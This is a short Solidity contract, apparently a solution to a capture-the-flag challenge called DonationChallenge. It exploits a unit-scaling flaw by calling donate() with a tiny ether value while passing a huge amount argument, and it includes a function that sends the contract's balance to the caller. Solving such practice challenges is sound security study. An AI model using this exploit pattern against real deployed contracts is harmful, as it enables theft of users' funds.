pragma solidity 0.8.7;

interface IDonationChallenge {
    function donate(uint256 etherAmount) external payable;
    function withdraw() external;
}

contract DonationChallengeHack {
    IDonationChallenge public dncInstance;

    constructor (IDonationChallenge _dncInstance) payable {
        require(msg.value >= 1, "not enough money");
        dncInstance = _dncInstance;
    }

    function attack(uint256 _amount) public payable {
        dncInstance.donate{value: _amount / 10**36}(_amount);
    }

    function destroy() public payable{
        payable(tx.origin).transfer(address(this).balance);
    }
    
    receive() external payable{}
}